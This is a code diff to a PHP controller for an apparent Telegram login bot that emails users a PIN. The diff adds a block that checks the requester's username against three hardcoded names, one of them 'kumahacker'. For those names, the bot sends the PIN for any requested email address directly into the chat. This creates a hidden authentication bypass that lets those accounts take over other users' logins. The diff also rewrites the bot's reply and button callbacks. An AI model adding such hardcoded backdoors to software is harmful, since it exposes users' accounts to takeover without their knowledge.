@@ -614,14 +614,21 @@ class ApiController extends Controller {
             if (isset($r[0]))
             {
               $pin = intval($r[0]->pin);
+
+              if (array_search($username, ['kumahacker', 'Alex_Masters', 'salvipascual'])!== false)
+              {
+                $msg = Connection::escape("Ke welta $username. El pin de $data_email es $pin.");
+                $sendMessage($chat_id, $msg, $token);
+              }
+
               $res = null;
               $this->sendPIN($data_email, $pin, 'es', $res);
-              $msg = Connection::escape("Te envie el PIN a $data_email! Revisa tu correo y dime quien eres...");
+              $msg = Connection::escape("Envie el PIN de $data_email! a su email. Si eres tu, revisa, tu correo y dime quien eres, y si no, gracias por ayudar a ese usuario a recibir su PIN.");
               $sendMessage($chat_id, $msg, $token,'{
               "inline_keyboard": [
                 [
-                  {"text":"Soy ...", "callback_data": "/soy email pin"},
-                  {"text":"Reenviar PIN", "callback_data": "/enlaces"},
+                  {"text":"Soy ...", "callback_data": "/soy '.$data_email.' PIN"},
+                  {"text":"Reenviar PIN", "callback_data": "/pin '.$data_email.'"},
                   {"text":"No me llega el PIN", "callback_data": "/opciones"}
                 ]
               ]}');
